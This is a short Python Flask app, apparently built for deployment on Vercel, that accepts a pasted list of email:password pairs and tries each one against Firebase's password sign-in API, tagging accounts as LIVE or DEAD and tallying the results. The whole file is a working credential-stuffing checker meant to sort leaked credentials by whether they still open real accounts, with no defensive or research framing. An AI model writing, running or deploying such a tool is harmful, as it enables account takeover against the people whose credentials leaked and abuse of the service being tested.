import os
import requests
from flask import Flask, render_template, request, jsonify

# Vercel için Flask nesnesi adı mutlaka 'app' olmalı
app = Flask(__name__)

# API Key'i Vercel Ayarlarından çekiyoruz
API_KEY = os.getenv("FIREBASE_API_KEY")

def check_account(email, password):
    url = f"https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key={API_KEY}"
    payload = {"email": email, "password": password, "returnSecureToken": True}
    try:
        r = requests.post(url, json=payload, timeout=7)
        return "LIVE" if r.status_code == 200 else "DEAD"
    except:
        return "ERROR"

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/start_scan', methods=['POST'])
def start_scan():
    data = request.json
    combos = data.get('combos', '').splitlines()
    
    results = []
    stats = {"live": 0, "dead": 0, "checked": 0}

    # HATA ÇÖZÜMÜ: ThreadPool yerine normal döngü kullanıyoruz
    for line in combos:
        if ":" in line:
            email, password = line.split(":", 1)
            status = check_account(email.strip(), password.strip())
            
            stats["checked"] += 1
            if status == "LIVE":
                stats["live"] += 1
                results.append({"account": line, "status": "LIVE"})
            else:
                stats["dead"] += 1
                results.append({"account": line, "status": "DEAD"})
    
    return jsonify({"results": results, "stats": stats})

if __name__ == '__main__':
    app.run(debug=True)
